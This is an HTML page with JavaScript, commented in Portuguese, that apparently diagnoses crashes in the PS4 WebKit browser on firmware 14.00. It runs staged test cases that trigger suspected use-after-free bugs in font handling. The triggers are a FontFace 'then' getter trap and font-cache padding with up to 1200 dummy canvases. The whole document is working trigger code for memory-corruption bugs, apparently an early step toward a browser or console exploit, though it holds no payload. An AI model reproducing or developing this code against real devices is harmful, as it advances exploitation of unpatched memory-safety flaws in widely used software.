<!DOCTYPE html>
<html>
<head><meta charset="utf-8"></head>
<body>
<pre id="log"></pre>
<script>
// DIAGNOSTICO DE CRASH — PS4 FW 14.00
// Objetivo: isolar o mecanismo exato do crash no hibrido
//
// Logica dos testes (do mais simples ao mais complexo):
//
//  Teste 1 — 1 face, 0 dummies
//    Minimo possivel. Se crashar: UAF #2 (GlyphGeometryCache) e standalone —
//    o getter trap sozinho com 1 face e suficiente. Mecanismo identico ao 42b1e2a.
//
//  Teste 2 — 2 faces, FAMILIAS DIFERENTES, 0 dummies
//    Sem constituentFaces loop (1 face por familia) e sem dummies.
//    Se crashar: UAF #2 e ativado por 2 faces de familias diferentes sem dummies.
//    Se nao: precisa de dummies OU de mesma familia.
//
//  Teste 3 — 1 face, 200 dummies
//    Dummies leves. Se crashar: pruneUnreferencedEntries dispara com <1000 entradas
//    nesta versao do PS4 WebKit.
//
//  Teste 4 — 1 face, 1200 dummies
//    Dummies pesados (acima do threshold documentado de 1000).
//    Se crashar: pruneUnreferencedEntries + getter com 1 face e suficiente.
//    Indica que a diferenca entre Tests 1 e 4 e apenas os dummies.
//
//  Teste 5 — 2 faces, FAMILIAS DIFERENTES, 1200 dummies  [CRASH ESPERADO]
//    Hibrido confirmado. Serve de ancora: se nenhum anterior crashou,
//    este deve crashar (ja confirmado). Valida que a sessao esta funcionando.
//
//  Teste 6 — 2 faces, MESMA familia, 0 dummies            [CRASH ESPERADO]
//    Padrao original 42b1e2a. Ultimo recurso caso o 5 tambem nao tenha crashado.
//
// LEITURA DO RESULTADO:
//   "EXECUTANDO measureText..." e a ultima linha antes de um eventual crash.
//   O numero do teste nessa linha = mecanismo minimo confirmado.

var out = document.getElementById('log');
var buf = '';
function log(s) { buf += s + '\n'; out.textContent = buf; }

function loadFontAsDataURL(path) {
    return fetch(path)
        .then(function(r) {
            if (!r.ok) throw new Error('HTTP ' + r.status);
            return r.arrayBuffer();
        })
        .then(function(buf) {
            return new Promise(function(res, rej) {
                var fr = new FileReader();
                fr.onload  = function(e) { res(e.target.result); };
                fr.onerror = rej;
                fr.readAsDataURL(new Blob([buf], { type: 'font/woff' }));
            });
        });
}

loadFontAsDataURL('resources/Ahem.woff').then(function(dataUrl) {

    var uid     = 0;   // contador global para nomes unicos de fontes
    var dummyId = 0;   // contador global para nomes unicos de dummies
    var alive   = [];  // evita GC prematuro

    function fontUrl(d) { return 'url("' + d + '")'; }

    // Cria N canvas dummy com familias unicas para popular o FontCascadeCache.
    // Os dummies de testes anteriores ACUMULAM — anotado nos logs.
    function addDummies(n) {
        for (var i = 0; i < n; i++) {
            var d = document.createElement('canvas');
            d.width = 1; d.height = 1;
            d.getContext('2d').font = '10px "D' + (dummyId++) + '"';
            alive.push(d);
        }
    }

    // Getter trap identico ao commit 42b1e2a
    function makeGetter() {
        return function() {
            document.fonts.add(new FontFace('U' + (uid++), 'local("x")'));
        };
    }

    // Cria canvas fora da tela e retorna contexto com fonte configurada
    function makeCtx(fontStr) {
        var c = document.createElement('canvas');
        c.width = 64; c.height = 64;
        c.style.cssText = 'position:absolute;left:-9999px';
        document.body.appendChild(c);
        var ctx = c.getContext('2d');
        ctx.font = fontStr;
        alive.push(c, ctx);
        return ctx;
    }

    // -----------------------------------------------------------------------
    // Definicao dos testes
    // -----------------------------------------------------------------------
    var tests = [

        // -------------------------------------------------------------------
        {
            id:   1,
            name: '1 face  |  familia unica  |  0 dummies',
            info: 'Gatilho minimo possivel para UAF #2 sozinho',
            dummies: 0,
            run: function() {
                var id = uid++;
                var f  = new FontFace('S' + id, fontUrl(dataUrl));
                document.fonts.add(f);
                void f.loaded;
                Object.defineProperty(f, 'then', { get: makeGetter() });
                alive.push(f);
                makeCtx('10px S' + id).measureText('\u13A0\u13A2\u13A4');
            }
        },

        // -------------------------------------------------------------------
      /*  {
            id:   2,
            name: '2 faces  |  FAMILIAS DIFERENTES  |  0 dummies',
            info: 'Sem constituentFaces loop, sem dummies — diferencia UAF #1 vs #2',
            dummies: 0,
            run: function() {
                var id = uid++;
                var f1 = new FontFace('D' + id,       fontUrl(dataUrl));
                var f2 = new FontFace('M' + id,       fontUrl(dataUrl),
                                      { unicodeRange: 'U+13A0-13FF' });
                document.fonts.add(f1);
                document.fonts.add(f2);
                void f1.loaded;
                void f2.loaded;
                var g = makeGetter();
                Object.defineProperty(f1, 'then', { get: g });
                Object.defineProperty(f2, 'then', { get: g });
                alive.push(f1, f2);
                makeCtx('10px D' + id + ', M' + id).measureText('\u13A0\u13A2\u13A4');
            }
        },

        // -------------------------------------------------------------------
        {
            id:   3,
            name: '1 face  |  familia unica  |  200 dummies  (total acumulado: ~200)',
            info: 'Dummies leves — limiar de pruneUnreferencedEntries < 1000?',
            dummies: 200,
            run: function() {
                var id = uid++;
                var f  = new FontFace('S' + id, fontUrl(dataUrl));
                document.fonts.add(f);
                void f.loaded;
                Object.defineProperty(f, 'then', { get: makeGetter() });
                alive.push(f);
                makeCtx('10px S' + id).measureText('\u13A0\u13A2\u13A4');
            }
        },
*/
        // -------------------------------------------------------------------
        {
            id:   4,
            name: '1 face  |  familia unica  |  1200 dummies  (total acumulado: ~1400)',
            info: 'Dummies pesados — pruneUnreferencedEntries completo com 1 face?',
            dummies: 1200,
            run: function() {
                var id = uid++;
                var f  = new FontFace('S' + id, fontUrl(dataUrl));
                document.fonts.add(f);
                void f.loaded;
                Object.defineProperty(f, 'then', { get: makeGetter() });
                alive.push(f);
                makeCtx('10px S' + id).measureText('\u13A0\u13A2\u13A4');
            }
        },

        // -------------------------------------------------------------------
        {
            id:   5,
            name: '2 faces  |  FAMILIAS DIFERENTES  |  1200 dummies  [CRASH ESPERADO]',
            info: 'HIBRIDO — ancora de confirmacao (crash ja confirmado anteriormente)',
            dummies: 1200,
            run: function() {
                var id = uid++;
                var f1 = new FontFace('D' + id,       fontUrl(dataUrl));
                var f2 = new FontFace('M' + id,       fontUrl(dataUrl),
                                      { unicodeRange: 'U+13A0-13FF' });
                document.fonts.add(f1);
                document.fonts.add(f2);
                void f1.loaded;
                void f2.loaded;
                var g = makeGetter();
                Object.defineProperty(f1, 'then', { get: g });
                Object.defineProperty(f2, 'then', { get: g });
                alive.push(f1, f2);
                makeCtx('10px D' + id + ', M' + id).measureText('\u13A0\u13A2\u13A4');
            }
        },

        // -------------------------------------------------------------------
        {
            id:   6,
            name: '2 faces  |  MESMA familia  |  0 dummies  [CRASH ESPERADO]',
            info: 'ORIGINAL 42b1e2a — ancora final (crash ja confirmado)',
            dummies: 0,
            run: function() {
                var id = uid++;
                var f1 = new FontFace('TF' + id, fontUrl(dataUrl));
                var f2 = new FontFace('TF' + id, fontUrl(dataUrl));
                document.fonts.add(f1);
                document.fonts.add(f2);
                void f1.loaded;
                void f2.loaded;
                var g = makeGetter();
                Object.defineProperty(f1, 'then', { get: g });
                Object.defineProperty(f2, 'then', { get: g });
                alive.push(f1, f2);
                makeCtx('10px Times, TF' + id).measureText('\u13A0\u13A2\u13A4');
            }
        }
    ];

    // -----------------------------------------------------------------------
    // Runner sequencial com pausas para o DOM renderizar antes do crash
    // -----------------------------------------------------------------------
    var idx = 0;

    function next() {
        if (idx >= tests.length) {
            log('');
            log('=== TODOS OS TESTES PASSARAM SEM CRASH ===');
            log('Resultado inesperado — revisar configuracao.');
            return;
        }
        var t = tests[idx++];

        log('┌─ Teste ' + t.id + ': ' + t.name);
        log('│  ' + t.info);
        if (t.dummies > 0) log('│  Adicionando ' + t.dummies + ' dummies...');

        // Pausa para DOM renderizar o cabecalho antes de qualquer operacao
        setTimeout(function() {
            addDummies(t.dummies);
            // Segunda pausa: garante que "EXECUTANDO" e visivel antes do crash
            log('│  [EXECUTANDO measureText...] <<< se crash: ESTE teste e o ponto exato');
            setTimeout(function() {
                t.run();
                log('└─ PASSOU (sem crash)\n');
                next();
            }, 200);
        }, 150);
    }

    log('=== DIAGNOSTICO DE CRASH — PS4 FW 14.00 ===');
    log('Ahem.woff OK. Leia os resultados de cima para baixo.');
    log('O teste que travar com "EXECUTANDO" na ultima linha = mecanismo minimo.\n');
    next();

}).catch(function(e) {
    document.getElementById('log').textContent = 'ERRO: ' + e.message;
});
</script>
</body>
</html>
